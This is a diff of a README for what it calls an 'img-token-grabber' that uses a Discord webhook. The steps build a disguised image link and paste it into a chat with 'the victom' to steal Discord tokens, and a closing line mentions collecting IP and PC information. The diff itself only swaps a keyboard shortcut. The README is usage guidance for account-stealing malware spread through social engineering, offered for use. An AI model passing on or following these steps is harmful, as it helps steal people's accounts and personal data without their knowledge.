@@ -8,7 +8,7 @@ An img-token-grabber with an Discord-Webhook connection!
 3. The url of the picture => use imgur for example
 4. Choose the name, that the picture should be named
 5. Hit the **Build** Button and you will get the link of the picture directly in your clip board.
-6. Go to the chat with the victom and press **CMD + V** or paste the link in
+6. Go to the chat with the victom and press **CTRL + V** or paste the link in
 
 Also see
 ip and pc information
